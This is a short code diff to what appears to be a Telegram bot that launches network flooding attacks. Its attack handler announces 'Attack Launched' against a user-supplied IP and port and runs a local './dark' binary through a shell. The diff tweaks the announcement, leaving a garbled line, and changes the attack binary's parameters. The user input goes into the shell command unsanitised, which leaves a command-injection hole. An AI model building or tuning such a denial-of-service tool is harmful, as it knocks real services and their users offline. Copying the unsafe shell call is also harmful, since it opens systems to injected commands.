@@ -247,7 +247,7 @@ async def attack(update: Update, context: CallbackContext):
             f"*⚔️ Attack Launched! ⚔️*\n"
             f"*🎯 Target: {ip}:{port}*\n"
             f"*🕒 Duration: {duration} seconds*\n"
-            f"*🔥 Let the battlefield ignite! 💥*"
+            f"*🔥 Let the battlefield• 💥*"
         ),
         parse_mode='Markdown'
     )
@@ -258,7 +258,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./dark {ip} {port} {duration} 50",
+            f"./dark {ip} {port} {duration} 9 900",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
